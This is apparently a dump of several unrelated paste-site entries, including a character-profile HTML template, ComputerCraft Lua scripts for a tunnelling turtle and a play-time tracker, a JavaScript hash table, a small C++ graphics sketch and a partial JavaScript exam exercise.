                            <div class=""px-3 text-capitalize"" style=""font-size:20px; font-style:italic; font-family:'Times New Roman'; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">dislikes</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-xmark fa-xs mr-2""></i>content</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-xmark fa-xs mr-2""></i>content</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-xmark fa-xs mr-2""></i>content</div>
                        </div>
                        <!-- END DISLIKES -->
                        
                    </div>
                    <!-- END TAB 2 ------------------>
                    
                    
                    <!-- TAB 3 ---------------------->
                    <div id=""TAB_ID3"" class=""tab-pane fade"">
                        
                        <!-- ABILITY 1 -->
                        <div class=""mt-3"">
                            
                            <!-- HEADER -->
                            <div class=""row no-gutters align-items-end pl-3 text-capitalize"" style=""font-style:italic; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">
                                <div class=""col"" style=""font-size:20px; font-family:'Times New Roman';"">ability
                                    <span style=""font-size:15px;"">1</span>
                                </div>
                                
                                <div class=""col-auto mb-1"" style=""font-size:10px;"">ability name</div>
                            </div>
                            
                            <!-- INFO -->
                            <div class=""my-1"">content</div>
                            
                        </div>
                        <!-- END ABILITY 1 -->
                        
                        
                        <!-- ABILITY 2 -->
                        <div class=""mt-3"">
                            
                            <!-- HEADER -->
                            <div class=""row no-gutters align-items-end pl-3 text-capitalize"" style=""font-style:italic; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">
                                <div class=""col"" style=""font-size:20px; font-family:'Times New Roman';"">ability
                                    <span style=""font-size:15px;"">2</span>
                                </div>
                                
                                <div class=""col-auto mb-1"" style=""font-size:10px;"">ability name</div>
                            </div>
                            
                            <!-- INFO -->
                            <div class=""my-1"">content</div>
                            
                        </div>
                        <!-- END ABILITY 2 -->
                        
                        
                        <!-- ABILITY 3 -->
                        <div class=""mt-3"">
                            
                            <!-- HEADER -->
                            <div class=""row no-gutters align-items-end pl-3 text-capitalize"" style=""font-style:italic; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">
                                <div class=""col"" style=""font-size:20px; font-family:'Times New Roman';"">ability
                                    <span style=""font-size:15px;"">3</span>
                                </div>
                                
                                <div class=""col-auto mb-1"" style=""font-size:10px;"">ability name</div>
                            </div>
                            
                            <!-- INFO -->
                            <div class=""my-1"">content</div>
                            
                        </div>
                        <!-- END ABILITY 3 -->
                        
                        
                        <!-- TRIVIA -->
                        <div class=""my-3"">
                            <div class=""px-3 text-capitalize"" style=""font-size:20px; font-style:italic; font-family:'Times New Roman'; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">trivia</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-star fa-xs mr-2""></i>content</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-star fa-xs mr-2""></i>content</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-star fa-xs mr-2""></i>content</div>
                        </div>
                        <!-- END TRIVIA -->
                        
                    </div>
                    <!-- END TAB 2 ------------------>
                    
                    <!-- add more above here -->
                    
                </div>
                <!-- END TAB CONTENT ---------------->
            
            
                <!-- TAB NAVIGATION BUTTONS ---------
                - make sure href is different from one
                - another and match an id in tab
                -
                - href should have # and no spaces
                -
                - only one href and id in tab content
                - should have active in the class
                ------------------------------------->
                <div class=""col-12 d-flex row no-gutters text-center"">
                    <a href=""#COLLAPSE_ID"" data-toggle=""collapse"" role=""button"" aria-expanded=""false"" class=""col-12"" style=""color:rgba(255, 255, 255, .7);""><i class=""fa-solid fa-caret-down""></i></a>
                    
                    <!-- DROP DOWN MENU ------------->
                    <div id=""COLLAPSE_ID"" class=""collapse col-12""><ul class=""nav flex-column card"" style=""border-color:rgba(255, 255, 255, .5); background-color:rgba(0, 0, 0, .7); font-variant:small-caps;"">
                        <li class=""nav-item mx-2"" style=""border-bottom:1px dotted rgba(255, 255, 255, .5);""><a href=""#TAB_ID1"" data-toggle=""tab"" class=""active nav-link"" style=""color:rgba(255, 255, 255, .5);"">basic info</a></li>
                          
                        <li class=""nav-item mx-2"" style=""border-bottom:1px dotted rgba(255, 255, 255, .5);""><a href=""#TAB_ID2"" data-toggle=""tab"" class=""nav-link"" style=""color:rgba(255, 255, 255, .5);"">about</a></li>
                          
                        <li class=""nav-item""><a href=""#TAB_ID3"" data-toggle=""tab"" class=""nav-link"" style=""color:rgba(255, 255, 255, .5);"">extra</a></li>
                        
                        <!-- add more above here -->
                        
                    </ul></div>
                    <!-- END DROP DOWN MENU -------->
                    
                </div>
                <!-- END TAB NAVIGATION BUTTONS ---->
                
            </div>
            <!-- END MIDDLE BOX -------------------->
            
            
            <!-- RIGHT DECOR ----------------------->
            <div class=""col-4 mb-3""><div style=""height:70%;""></div><div class=""card rounded-0 faded"" style=""height:30%; border-width:0 2px 2px 0; background-color: transparent; border-color:#fff;""></div></div>
            
        </div>
        <!-- END CHARACTER INFO -------------------->
        
        
        
        <!-- QUOTE --------------------------------->
        <div class=""col-11 my-3 mx-auto display-4"" style=""font-style:italic; font-family:'Times New Roman'; text-shadow:2px 2px #000;"">
            <div class=""col-9 row no-gutters"">
                <i class=""fa-solid fa-quote-left""></i>
                <div class=""col ml-3 pt-3"">first half quote</div>
            </div>
            
            <div class=""col-9 ml-auto row no-gutters align-items-end text-right"">
                <div class=""col mr-3 pb-3"">second half quote</div>
                <i class=""fa-solid fa-quote-right""></i>
            </div>
        </div>
        <!-- END QUOTE ----------------------------->
        
        
        <!-- BOTTOM DECOR -------------------------->
        <div class=""col-12 d-flex my-3 justify-content-end"">
            <div class=""pt-2 px-1"" style=""background-color:#fff;""></div>
            <div class=""ml-2 pt-2 px-2"" style=""background-color:#fff;""></div>
            <div class=""ml-2 pt-2 px-4"" style=""background-color:#fff;""></div>
            <div class=""col-7 ml-2 pt-2"" style=""background-color:#fff;""></div>
        </div>
        <!-- END BOTTOM DECOR ---------------------->
        
        
        <!-- CHARACTER IMAGE -----------------------
        - feel free to mess with ""right"" to change
        - position of image or delete if if you
        - want it centered
        -
        - will look better if image is transparent
        -------------------------------------------->
        <div style=""position:absolute; top:0; right:-80px; height:100%; width:100%;
            background-image:url('https://f2.toyhou.se/file/f2-toyhou-se/images/30558913_RVHLwslAUnfKGVv.png?1641885769');
            background-size:cover; background-position:center top; background-repeat:no-repeat;""></div>
            
    </div>
    <!-- END LEFT SIDE / MAIN CODE ----------------->
    
    
    
    
    <!-- RIGHT SIDE / RELATIONSHIPS ---------------->
    <div class=""col-lg mt-2 mt-lg-0 ml-lg-2"" style=""overflow-y:auto; max-height:805px;"">
        
        <!-- RELATIONSHIP 1 ------------------------>
        <div class=""mt-4 mb-2"" style=""position:relative;"">
            
            <!-- IMG / LINK / REL STATS ------------>
            <div class=""mt-5 mr-4"">
                <a href=""CONTENT"" class=""p-2 card rounded-0"" style=""background-color:rgba(255, 255, 255, .7);""><img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/58838498_C6yzAnYXb3qZtyu.jpg?1689486855"" style=""height:200px; width:100%; object-position:top center; object-fit:cover;""></a>
                
                <div class=""mb-2 mr-5 text-capitalize"" style=""position:absolute; bottom:0; right:0; color:#000; font-style:italic; font-family:'Times New Roman'; font-weight:800;"">relationship status</div>
            </div>
            <!-- END IMG / LINK / REL STATS -------->
            
            <!-- TEXT BOX -------------------------->
            <div class=""col-10 pt-2 pb-5"" style=""position:absolute; top:-40px; right:0; clip-path:polygon(0% 0%, 100% 0%, 100% 75%, 80% 75%, 65% 100%, 60% 75%, 0% 75%); background-color:rgba(0, 0, 0, .7);"">
                <div class=""text-center"" style=""overflow:auto; max-height:80px;"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.</div>
            </div>
            
        </div>
        <!-- END RELATIONSHIP 1 -------------------->
        
        
        <!-- RELATIONSHIP 2 ------------------------>
        <div class=""mt-4 mb-2"" style=""position:relative;"">
            
            <!-- IMG / LINK / REL STATS ------------>
            <div class=""mt-5 mr-4"">
                <a href=""CONTENT"" class=""p-2 card rounded-0"" style=""background-color:rgba(255, 255, 255, .7);""><img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/58838498_C6yzAnYXb3qZtyu.jpg?1689486855"" style=""height:200px; width:100%; object-position:top center; object-fit:cover;""></a>
                
                <div class=""mb-2 mr-5 text-capitalize"" style=""position:absolute; bottom:0; right:0; color:#000; font-style:italic; font-family:'Times New Roman'; font-weight:800;"">relationship status</div>
            </div>
            <!-- END IMG / LINK / REL STATS -------->
            
            <!-- TEXT BOX -------------------------->
            <div class=""col-10 pt-2 pb-5"" style=""position:absolute; top:-40px; right:0; clip-path:polygon(0% 0%, 100% 0%, 100% 75%, 80% 75%, 65% 100%, 60% 75%, 0% 75%); background-color:rgba(0, 0, 0, .7);"">
                <div class=""text-center"" style=""overflow:auto; max-height:80px;"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.</div>
            </div>
            
        </div>
        <!-- END RELATIONSHIP 2 -------------------->
        
        
        <!-- RELATIONSHIP 3 ------------------------>
        <div class=""mt-4 mb-2"" style=""position:relative;"">
            
            <!-- IMG / LINK / REL STATS ------------>
            <div class=""mt-5 mr-4"">
                <a href=""CONTENT"" class=""p-2 card rounded-0"" style=""background-color:rgba(255, 255, 255, .7);""><img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/58838498_C6yzAnYXb3qZtyu.jpg?1689486855"" style=""height:200px; width:100%; object-position:top center; object-fit:cover;""></a>
                
                <div class=""mb-2 mr-5 text-capitalize"" style=""position:absolute; bottom:0; right:0; color:#000; font-style:italic; font-family:'Times New Roman'; font-weight:800;"">relationship status</div>
            </div>
            <!-- END IMG / LINK / REL STATS -------->
            
            <!-- TEXT BOX -------------------------->
            <div class=""col-10 pt-2 pb-5"" style=""position:absolute; top:-40px; right:0; clip-path:polygon(0% 0%, 100% 0%, 100% 75%, 80% 75%, 65% 100%, 60% 75%, 0% 75%); background-color:rgba(0, 0, 0, .7);"">
                <div class=""text-center"" style=""overflow:auto; max-height:80px;"">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.</div>
            </div>
            
        </div>
        <!-- END RELATIONSHIP 3 -------------------->
        
        <!-- add more above here -->
        
    </div>
    <!-- END RIGHT SIDE / RELATIONSHIPS ------------>
    
    
    
    <!-- CREDITS - FEEL FREE TO MOVE --------------->
    <div class=""col-12 mt-1 row no-gutters align-items-center text-center"" style=""font-size:10px;"">
        <div class=""col""><hr style=""background-color:#fff;""></div>
        
        <div class=""col-auto mx-1"">
            <a href=""https://toyhou.se/12087247.-genshin-character-splash"" data-toggle=""tooltip"" title=""Inspo Credit""><i class=""fa-regular fa-sparkle fa-xs"" style=""color:#fff;""></i></a>
            <a href="""" data-toggle=""tooltip"" title=""Code""><i class=""fa-solid fa-trash"" style=""color:#fff;""></i></a>
            <a href="""" data-toggle=""tooltip"" title=""Background Image""><i class=""fa-regular fa-sparkle fa-xs"" style=""color:#fff;""></i></a>
        </div>
        
        <div class=""col""><hr style=""background-color:#fff;""></div>
    </div>
    <!-- END CREDITS ------------------------------->
    
</div>"
7Ayqp6Kg,python_OOP1,miklik,Python,Wednesday 7th of February 2024 03:15:44 PM CDT,"#Třída
class Car:
  this.brand = ''
  this.type = ''
  this.color = ''
  this.fuel = ''

  def get_fullname(self):
    return this.brand + ' ' + this.type

#Instance
car1 = Car()
car2 = Car()
car3 = Car()"
ba3ut2Hb,Minecraft Computer Craft Advanced Tunnel,zkb1325,Lua,Wednesday 7th of February 2024 03:14:42 PM CDT,"shell.run(""clear"")

while tunnelLength == nil do
    term.setCursorPos(1, 1)
    term.clearLine()
    term.write(""Tunnel Length: "")
    tunnelLength = tonumber(read())
end

while tunnelWidth == nil do
    term.setCursorPos(1, 2)
    term.clearLine()
    term.write(""Tunnel Width: "")
    tunnelWidth = tonumber(read())
end

while tunnelHeight == nil do
    term.setCursorPos(1, 3)
    term.clearLine()
    term.write(""Tunnel Height: "")
    tunnelHeight = tonumber(read())
end

while skipedRows == nil do
    term.setCursorPos(1, 4)
    term.clearLine()
    term.write(""Skip Rows: "")
    skipedRows = tonumber(read())
end

if tunnelHeight > 1 then
    while lightSpacing == nil do
        term.setCursorPos(1, 5)
        term.clearLine()
        term.write(""Light spacing (0 for no lights): "")
        lightSpacing = tonumber(read())
        if lightSpacing == 1 then
            print("" - Must be greater then 1"")
            lightSpacing = nil
        end
    end
else
    lightSpacing = 0
end

local estimatedFuelUsage = tunnelWidth*2*tunnelLength*tunnelHeight
estimatedFuelUsage = tunnelHeight*2*tunnelLength + estimatedFuelUsage + tunnelLength
estimatedFuelUsage = skipedRows*2 + estimatedFuelUsage
estimatedFuelUsage = math.ceil(estimatedFuelUsage)

term.clear()
term.setCursorPos(1,1)
print(""""..tunnelLength.."" blocks long, ""..tunnelWidth.."" blocks wide, and ""..tunnelHeight.."" blocks tall"")
if lightSpacing == 0 then
    print(""No lights will be placed"")
else
    print(""A light will be placed from slot 16 every ""..lightSpacing.."" blocks, place a chest to the right to refill"")
end
print("""")
print(""Current fuel: ""..turtle.getFuelLevel())
print(""Estimated fuel usage: ""..estimatedFuelUsage)
if turtle.getFuelLevel() < estimatedFuelUsage then
    print(""!!! Turtle may run out of fuel before finishing !!!"")
end
print("""")
print(""Press ENTER to confirm or type <restart> to start over or type <exit> to exit program"")
term.write(""Confirm: "")
confirmStart = read()
if confirmStart == ""restart"" then
    shell.exit()
    shell.run(shell.getRunningProgram())
    return
end
if confirmStart == ""exit"" then
    term.clear()
    term.setCursorPos(1,1)
    return
end
term.clear()
term.setCursorPos(1, 1)

local fuelUsed = 0
local blocksBroken = 0
local blocksToBreak = tunnelWidth*tunnelHeight*tunnelLength
local currentTunnelLength = 1
local turtlePosX = 1
local turtlePosY = 1
local turtlePosZ = 0
local notification = """"
local startTime = os.epoch(""utc"")/1000

function digWidth(w)
    for u = 1, w-1 do
        if shouldPlaceLight() then 
            placeLight()
        end
        while turtle.dig() == true do
            blocksBroken = blocksBroken + 1
            sleep(0.6)
        end
        if turtle.forward() == false then
            turtle.dig()
            blocksBroken = blocksBroken + 1
        end

        if turtlePosY%2 == 1 then
            turtlePosX = turtlePosX + 1
        else
            turtlePosX = turtlePosX - 1
        end
        fuelUsed = fuelUsed + 1
        printTurtleStats()
    end
end

function reverse(w)
    for u = 1, w-1 do
        turtle.back()
        turtlePosX = turtlePosX - 1
        fuelUsed = fuelUsed + 1
        printTurtleStats()
    end
end

function prepForNextRow()
    while turtle.digUp() == true do
        blocksBroken = blocksBroken + 1
        sleep(0.6)
    end
    if turtle.up() == false then
        turtle.digUp()
        blocksBroken = blocksBroken + 1
    end

    turtlePosY = turtlePosY + 1
    fuelUsed = fuelUsed + 1
    turtle.turnLeft()
    turtle.turnLeft()
end

function digOutNextSection()
    while turtle.dig() == true do
        blocksBroken = blocksBroken + 1
        sleep(0.6)
    end
    if turtle.forward() == false then
        turtle.dig()
        blocksBroken = blocksBroken + 1
    end

    turtlePosZ = turtlePosZ + 1
    fuelUsed = fuelUsed + 1
    printTurtleStats()

    turtle.turnRight()
    for h = 1, tunnelHeight do
        notification = ""Digging width""
        digWidth(tunnelWidth)
        if h < tunnelHeight then
            prepForNextRow()
        end
    end
    if turtlePosY%2 == 1 then
        notification = ""Reversing""
        reverse(tunnelWidth)
        turtle.turnLeft()
    else
        turtle.turnRight()
    end
    for h = 1, tunnelHeight-1 do
        while turtle.digDown() == true do
            blocksBroken = blocksBroken + 1
            sleep(0.6)
        end
        if turtle.down() == false then
            turtle.digDown()
            blocksBroken = blocksBroken + 1
        end
        turtlePosY = turtlePosY - 1
        fuelUsed = fuelUsed + 1
        printTurtleStats()
    end
end

function moveTurtleToChest()
    turtle.turnRight()
    turtle.turnRight()
    for i = 1, currentTunnelLength do
        turtle.forward()
        turtlePosZ = turtlePosZ - 1
        fuelUsed = fuelUsed + 1
        printTurtleStats()
    end
end

function moveTurtleBackToFront()
    turtle.turnLeft()
    turtle.turnLeft()
    for i = 1, currentTunnelLength do
        turtle.forward()
        turtlePosZ = turtlePosZ + 1
        fuelUsed = fuelUsed + 1
        printTurtleStats()
    end
end

function emptyTurtleToChest()
    for i = 1, 15 do
        turtle.select(i)
        turtle.drop()
    end
    turtle.select(1)
end

function turtleShouldEmpty()
    local occupiedSlots = 0
    for i = 1, 16 do
        if turtle.getItemCount(i) > 0 then
            occupiedSlots = occupiedSlots + 1
        end
        i = i + 1
    end
    return 16 - occupiedSlots <= 4
end

function shouldPlaceLight()
    if turtlePosX%lightSpacing == 0 and turtlePosZ%lightSpacing == 0 and turtlePosY == 2 then
        return true
    else
        return false
    end
end

function hasLights()
    return turtle.getItemCount(16) > 0
end

function placeLight()
    if not hasLights() then return end
    turtle.select(16)
    turtle.placeDown()
    turtle.select(1)
end

function lightChestAtStart()
    i,cd = turtle.inspect()
    return cd[""tags""][""forge:chests""] == true
end

function takeLights()
    turtle.select(16)
    turtle.suck(turtle.getItemSpace())
    turtle.select(1)
end

function disp_time(time)
    local days = math.floor(time/86400)
    local hours = math.floor(math.mod(time, 86400)/3600)
    local minutes = math.floor(math.mod(time,3600)/60)
    local seconds = math.floor(math.mod(time,60))
    return string.format(""%d:%02d:%02d:%02d"",days,hours,minutes,seconds)
end

function printTurtleStats()
    term.clear()
    term.setCursorPos(1, 1)
    local percent = math.ceil(blocksBroken/blocksToBreak*100)
    local checkTime = os.epoch(""utc"")/1000
    print(""Time Elapsed: ""..disp_time(checkTime-startTime))
    print(""Progress ""..percent..""% complete (""..blocksBroken..""/""..blocksToBreak.."")"")
    print(""Fuel used: ""..fuelUsed..""/""..estimatedFuelUsage)
    print(""Remaining estimated fuel usage: ""..estimatedFuelUsage-fuelUsed)
    print(""Fuel remaining: ""..turtle.getFuelLevel())
    print(""X: ""..turtlePosX)
    print(""Y: ""..turtlePosY)
    print(""Z: ""..turtlePosZ)
    print(notification)
end

for tl = 1, tunnelLength+skipedRows do
    if currentTunnelLength > skipedRows then
        digOutNextSection()
        printTurtleStats()

        if turtleShouldEmpty() and currentTunnelLength ~= tunnelLength then
            notification = ""Going to empty inventory""
            moveTurtleToChest()
            emptyTurtleToChest()
            if lightSpacing > 0 then
                turtle.turnLeft()
                if lightChestAtStart() then
                    takeLights()
                end
                turtle.turnRight()
            end
            notification = ""Moving back from chest""
            moveTurtleBackToFront()
        end
    else
        turtle.forward()
        turtlePosZ = turtlePosZ + 1
        fuelUsed = fuelUsed + 1
    end
    currentTunnelLength = currentTunnelLength + 1
end
currentTunnelLength = currentTunnelLength - 1
moveTurtleToChest()
printTurtleStats()
emptyTurtleToChest()
turtle.turnLeft()
turtle.turnLeft()
"
psDezSUF,Minecraft Computer Craft Play Time Tracker,zkb1325,Lua,Wednesday 7th of February 2024 03:13:12 PM CDT,"-- Run on a computer craft command computer
-- Will track the play time of players as they connect saving each players time to their own file
-- Will also display in chat players total time upon connecting and session time upon disconnecting
-- Uses vanilla command /list to get current online players so no peripherals needed
-- It will expect a monitor to be placed somewhere around the computer to display stats

PlayerData = {}

local function splitStr (inputstr)
    local t={}
    for str in string.gmatch(inputstr, ""([^%s]+)"") do
        table.insert(t, str)
    end
    return t
end

local function formatSeconds(seconds)
    local days = math.floor(seconds/86400)
    local hours = math.floor(math.mod(seconds, 86400)/3600)
    local minutes = math.floor(math.mod(seconds,3600)/60)
    local seconds = math.floor(math.mod(seconds,60))
    return string.format(""%d:%02d:%02d:%02d"",days,hours,minutes,seconds)
end

local function getOnlinePlayers()
    local list = {}
    local success, playersStr = commands.exec(""list"")
    playersStr[1] = string.gsub(playersStr[1], "","", """")
    local playersStrTable = splitStr(playersStr[1])
    local startIndex = false

    for _,p in ipairs(playersStrTable) do
        if startIndex then
            list[p] = p
        end
        if p == ""online:"" and not startIndex then
            startIndex = true
        end
    end
    return list
end

local function removeOldPlayers()
    local onlinePlayers = getOnlinePlayers()
    for i,pd in pairs(PlayerData) do
        if not onlinePlayers[i] then
            commands.say(i.."" disconnected after playing for ""..formatSeconds(PlayerData[i][""session""]))
            PlayerData[i] = nil
        end
    end
end
local function loadPlayerData(player)
    if fs.exists(player.."".txt"") then
        local playerFile = fs.open(player.."".txt"", ""r"")
        PlayerData[player] = {};
        PlayerData[player][""total""] = tonumber(playerFile.readLine())
        PlayerData[player][""session""] = 0
        playerFile.close()
    else
        PlayerData[player] = {};
        PlayerData[player][""total""] = 0
        PlayerData[player][""session""] = 0
    end
end

local function updatePlaytime()
    removeOldPlayers()

    for i,p in pairs(getOnlinePlayers()) do
        if not PlayerData[p] then 
            loadPlayerData(p)
            commands.say(p.."" joined with ""..formatSeconds(PlayerData[p][""total""]).."" total playtime"")
        end
        PlayerData[p][""session""] = PlayerData[p][""session""]+1
        PlayerData[p][""total""] = PlayerData[p][""total""]+1
        local playerFile = fs.open(p.."".txt"", ""w"")
        playerFile.write(PlayerData[p][""total""])
        playerFile.close()
    end
end

local cursorY = 1

m = peripheral.find(""monitor"")
m.setCursorPos(1,cursorY)
m.clear()
m.setBackgroundColor(colors.black)
m.setTextColor(colors.white)
m.setTextScale(1.5)


while true do
    updatePlaytime()
    m.clear()
    cursorY = 1

    m.setCursorPos(1,cursorY)
    cursorY = cursorY+1
    m.write(os.date(""%b %d %G %I:%M %p""))

    for i,p in pairs(getOnlinePlayers()) do
        if PlayerData[p] then
            m.setCursorPos(1,cursorY)
            cursorY = cursorY+1
            m.write(p)
            m.setCursorPos(3,cursorY)
            cursorY = cursorY+1
            m.write(""Session: ""..formatSeconds(PlayerData[p][""session""]))
            m.setCursorPos(3,cursorY)
            cursorY = cursorY+1
            m.write(""  Total: ""..formatSeconds(PlayerData[p][""total""]))
        end
    end
    sleep(1)
end
"
QUCwvkMX,HashTable.js,c-mcbride,JavaScript,Wednesday 7th of February 2024 02:30:18 PM CDT,"const sha256 = require('js-sha256');

class KeyValuePair {
  constructor(key, value) {
    this.key = key;
    this.value = value;
    this.next = null;
  }
}
class HashTable {
  constructor(numBuckets = 4) {
    this.count = 0;  //Number of elements in array
    this.capacity = numBuckets; //How many items the table can hold
    this.data = new Array(numBuckets) //Create array to hold values

    //Fill array with null values
    for(let i = 0; i < this.data.length; i++){
      this.data[i] = null;
    }
  }

  hash(key) {
    let rawValue = sha256(key); //Generate sha256 hash for key
    let firstEight = rawValue.slice(0,8) //Remove the first eight hex elements

    let returnValue = parseInt(firstEight, 16); //Convert the hex elements into int
    return returnValue; //Return int hash
  }

  hashMod(key) {
    let returnValue = this.hash(key) % this.capacity; //Make sure the return index is in array
    return returnValue;
  }

  insertNoCollisions(key, value) {
    const index = this.hashMod(key); //Generate a key to place the value
    let keyToAdd = new KeyValuePair(key,value);

    //If the index already has an element, throw error, if not add it
    if(this.data[index] !== null){
      throw new Error(""hash collision or same key/value pair already exists!"")
    }
    else{
      this.data[index] = keyToAdd;
      this.count++;
    }
  }

  insertWithHashCollisions(key, value) {
    const index = this.hashMod(key);
    let keyToAdd = new KeyValuePair(key, value);

    //This time, if the index is occupied create a linked list
    if(this.data[index] !== null){
        this.head = this.data[index];
        keyToAdd.next = this.head;
        this.data[index] = keyToAdd;
    }
    else{
      this.data[index] = keyToAdd;
    }

    this.count++;
  }

  insert(key, value) {
    const index = this.hashMod(key); //Generate index for node

    if(this.containsTargetKey(key)) { //Check for existence of key
      //If the key exists, start at the head of list and iterate through to find it
      let currentNode = this.data[index];

      while (currentNode) {
        if (currentNode.key === key) {
          currentNode.value = value; // Update the value of the existing key
          return;
        }
        currentNode = currentNode.next;
      }
    }
    else {
      let newNode = new KeyValuePair(key, value);

      //Set the next pointer to the existing head at the index if there is one, null otherwise
      newNode.next = this.data[index];
      this.data[index] = newNode; //Add the new node
      this.count++; //Increase count
    }
  }

  //Check hashmap to see if any objects at the index have a matching key.
  containsTargetKey(key) {
    const index = this.hashMod(key); //The key should have the same index
    let currentNode = this.data[index];

    //Transverse linked list in case of collision to see if any of the keys match
    while (currentNode) {
      if (currentNode.key === key) {
        return true;
      }
      currentNode = currentNode.next;
    }
    return false;
  }

  print() {
    for (let i = 0; i < this.data.length; i++) {
      let currentNode = this.data[i];
      let bucketStr = `Bucket ${i}: `;

      while (currentNode) {
        bucketStr += `{ Key: ${currentNode.key}, Value: ${currentNode.value} } -> `;
        currentNode = currentNode.next;
      }

      console.log(bucketStr + 'null');
    }
  }

}

let hashTable = new HashTable(2);
hashTable.insert(""key-1"", ""val-1"");
hashTable.insert(""key-2"", ""val-2"");
//hashTable.insert(""key-3"", ""val-3"");
hashTable.insert(""key-1"", ""val-100000"");
hashTable.print();

module.exports = HashTable;"
UDT1NvXq,Untitled,Nanoic,C++,Wednesday 7th of February 2024 01:52:59 PM CDT,"#define OLC_PGE_APPLICATION
#include ""olcPixelGameEngine.h""
using namespace std;

class NodeBoxes : public olc::PixelGameEngine
{
public:
	NodeBoxes() {
		sAppName = ""boxes"";


	}

	struct rect
	{
		olc::vf2d pos;
		olc::vf2d size;

	};


	//struct line {
	//	olc::vf2d initPos;
	//	olc::vf2d termPos;
	//};

public:
	bool OnUserCreate() override
	{
		return true;
	}

	bool OnUserUpdate(float fElapsedTime) override
	{

		float nodeAXPos = 50.0f;
		float nodeAYPos = 70.0f;
		
		float nodeBXPos = 110.0f;
		float nodeBYPos = 60.0f;

		float nodeAHeight = 50.0f;
		float nodeAWidth = 50.0f;

		float nodeBHeight = 50.0f;
		float nodeBWidth = 50.0f;


		rect r = { {nodeAXPos, nodeAYPos}, {nodeAHeight, nodeAWidth } };
		rect r2 = { {nodeBXPos, nodeBYPos}, {nodeBHeight, nodeBWidth } };

		//line l = { { nodeAXPos, nodeAYPos}, {nodeBXPos, nodeBYPos} };

		DrawRect(r.pos, r.size, olc::GREEN);
		DrawRect(r2.pos, r2.size, olc::RED);

		/*olc::vf2d a = {nodeBXPos, nodeAXPos};
		olc::vf2d b = { nodeBYPos, nodeAYPos };

		olc::vf2d c = a - b;

		float length = c.mag();
		std::cout << length << endl;*/

		DrawLine(r.pos + r.size / 2, r2.pos + r2.size / 2, olc::WHITE);
		

		return true;
	}
};

int main()
{
	NodeBoxes game;
	if (game.Construct(256, 240, 4, 4))
		game.Start();
	else
		std::wcout << ""L"" << std::endl;
	return 0;
}"
9tzKY3RG,02-prep-exam,Grossos,JavaScript,Wednesday 7th of February 2024 01:46:49 PM CDT,"// ⦁	Problem 2.Fashion Retail Management
 
// In the dynamic world of fashion retail, efficiently managing inventory is pivotal for catering to the ever-evolving demands of customers who seek clothing, shoes, and accessories. To meet these demands, you need to design a class named ""FashionRetailInventory with updated functionality tailored to this specialized environment.
// Functionality
// Constructor
// Should have these 3 properties:
// ⦁	storehouse  (string);
// ⦁	location  (string);
// ⦁	productStock   (empty array);
// At the initialization of the FashionRetailInventory class, the constructor accepts the storehouse and location. 

// addProduct (productName, size, quantity, price)
// This method adds a fashion product to the store's inventory. The method accepts four arguments:
// ⦁	productName (string);
// ⦁	size (string);
// ⦁	quantity (number);
// ⦁	price (number);
// ⦁	If a product with the same name and size already exists in the productStock, add the quantity to the product and return the following message:
// `You added ${quantity} more pieces of product ${productName} size ${size}`
// ⦁	Otherwise, add the product with properties: {productName, size, quantity, price} to the productStock and return the following message: 

// `The product ${productName}, size ${size} was successfully added to the inventory`
// sendProduct (productName, size) 
// This method allows the sending of a product from the store's inventory. The method accepts two arguments:
// ⦁	productName (string);
// ⦁	size (string);
// ⦁	If the product with the given name and size is not present in the productStock, throw an error with the following message:

// `The product ${productName}, size ${size} is not in the inventory`

// ⦁	Otherwise, remove the product from the productStock and return the following message:
// `The product ${productName}, size ${size} was successfully removed from the inventory`

// findProductsBySize(size)
// The method accepts one arguments:
// ⦁	size (string);

// ⦁	Iterate through the productStock array and find all products that match the specified size and return a list of the products that match the given size in the format:

// `${product1}-${quantity} pieces, ${product2}-${quantity} pieces,…`

// ⦁	If no products matching the specified size are found in the productStock, return:
// `There are no products available in that size`
// listProducts () 
// ⦁	If there are no products in stock, return:
// `${storehouse} storehouse is empty`
// ⦁	Otherwise, on the first line return:
// `${storehouse} storehouse in ${location} available products:`
// ⦁	On the next lines, display information about each product, sorted in alphabetical order by their productName in the following format:
// `${productName}/Size:${size}/Quantity:${quantity}/Price:${price}$`

class FashionRetailInventory {
    constructor(storehouse, location) {
        this.storehouse = storehouse;
        this.location = location;
        this.productStock = [];
    }

    addProduct(productName, size, qty, price) {
        debugger
        const existingProduct = this.productStock.find(product => product.productName === productName && product.size === size);

        if (existingProduct) {
            existingProduct.qty += qty;
            return `You added ${qty} more pieces of product ${productName} size ${size}`;
        } else {
            this.productStock.push({ productName, size, qty, price });
            return `The product ${productName}, size ${size} was successfully added to the inventory`;
        }
    }

    sendProduct(productName, size) {
        const existingProduct = this.productStock.find(product => product.productName === productName && product.size === size);

        if (existingProduct) {
            const idx = this.productStock.indexOf(existingProduct);
            this.productStock.splice(idx, 1);
            return `The product ${productName}, size ${size} was successfully removed from the inventory`;
        } else {

            throw new Error(`The product ${productName}, size ${size} is not in the inventory`);
        }
    }

    findProductsBySize(size) {
        const result = this.productStock.filter(product => product.size === size);

        if (result.length > 0) {
